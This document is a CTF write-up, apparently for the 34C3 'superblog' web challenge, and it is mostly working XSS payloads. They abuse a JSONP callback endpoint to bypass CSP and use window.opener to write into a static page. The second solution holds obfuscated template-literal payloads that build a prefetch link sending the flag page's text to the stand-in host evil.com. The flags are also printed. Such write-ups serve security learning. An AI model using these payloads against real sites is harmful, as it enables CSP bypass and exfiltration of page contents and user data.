### Solution 1

POST0

```
<a id="aa" href="http://localhost/post/post1"></a>
<script src="/feed?type=jsonp&cb=document.getElementById`aa`.click``,console.log"></script>
```

POST1

```
<a id="aa" href="post2" target="_blank"></a>
<a id="bb" href="/flag1"></a>
<script src="/feed?type=jsonp&cb=document.getElementById`aa`.click``,document.getElementById`bb`.click``,console.log"></script>
```

POST2

```
<a id="aa" href="post3" target="_blank"></a>
<a id="bb" href="/static/"></a>
<script src="/feed?type=jsonp&cb=document.getElementById`aa`.click``,document.getElementById`bb`.click``,console.log"></script>
```

POST4

```
<script src="evil.js"></script>
<script src="/feed?type=jsonp&cb=opener.document.write`${document.body.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.firstElementChild.innerText}`,console.log"></script>
```

1.Since static files was placed in the Nignx of 80 port , So the CSP didn't work.

2.We can location to another page ，then write the javascript code to the static page.

3.The opener for static became the flag page ,so we can leak the innerhtml to our service by "some attack".

The idea referenced in [link](https://blog.cal1.cn/post/34C3%20CTF%20web%20writeup).

### Solution 2

The following ideas referenced in CTFTIME.Constructing through a limited number of characters

For example: 

```
$,{,`
```

Exploit as follows:

```
<link id=foo rel=import href=/flag(1|2)>



<!-- superblog 1 - flag: 34C3_so_y0u_w3nt_4nd_learned_SOME_javascript_g00d_f0r_y0u -->
<script>
document.write`${Array.call`${atob`PA`}${`l`}${`i`}${`n`}${`k`}${atob`IA`}${`r`}${`e`}${`l`}${atob`PQ`}${atob`Ig`}${`p`}${`r`}${`e`}${`f`}${`e`}${`t`}${`c`}${`h`}${atob`Ig`}${atob`IA`}${`h`}${`r`}${`e`}${`f`}${atob`PQ`}${atob`Ig`}${`h`}${`t`}${`t`}${`p`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`evil`}${atob`Lg`}${`com`}${atob`Og`}${atob`Lw`}${Math.random``}${`_`}${escape.call`${document.getElementsByTagName`link`.item``.import.body.innerText}`}${atob`Ig`}${atob`Pg`}`.join``}`,
</script>

//Versions up to M80
  
<!-- superblog 2 - flag: 34C3_h3ncef0rth_peopl3_sh4ll_refer_t0_y0u_only_4s_th3_ES6+DOM_guru -->
<script>
document.write`${foo.import.body.innerHTML}`,document.write`${Array`${atob`PA`}${`input`}${atob`IA`}${`form`}${atob`PQ`}${`flagform`}${atob`IA`}${`name`}${atob`PQ`}${`captcha_answer`}${atob`IA`}${`x`}${atob`PQ`}${atob`Ig`}`.join``}${atob`Ig`}${`value`}${atob`PQ`}${parseInt.call`${foo.import.getElementById`flagform`.firstChild.nextSibling.nextSibling.textContent.split`%2b`.shift``}`%2bparseInt.call`${foo.import.getElementById`flagform`.firstChild.nextSibling.nextSibling.textContent.split`%2b`.pop``}`}${atob`Pg`}`,document.write`${atob`PA`}${`script`}${atob`IA`}${`src`}${atob`PQ`}${atob`Lw`}${`feed`}${atob`Pw`}${`type`}${atob`PQ`}${`jsonp`}${atob`Jq`}${`cb`}${atob`PQ`}${`flagform.lastElementChild.click`}${atob`YA`}${atob`YA`}${`,document.write${atob`YA`}${atob`JA`}${`{localStorage.getItem`}${atob`YA`}${`$`}${`{`}${atob`YA`}${atob`YA`}${`}`}${atob`YA`}${`}`}${`$`}${`{flag.innerText}`}${atob`YA`}${`,`}${atob`Pg`}${atob`PA`}${atob`Lw`}${`script`}${atob`Pg`}`}`,localStorage.setItem`${Array.call`}${atob`PA`}${`link`}${atob`IA`}${`rel`}${atob`PQ`}${atob`Ig`}${`prefetch`}${atob`Ig`}${atob`IA`}${`href`}${atob`PQ`}${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`evil`}${atob`Lg`}${`com`}${atob`Og`}${atob`Lw`}${Math.random``}${`_`}`.join``}`,
</script>
```

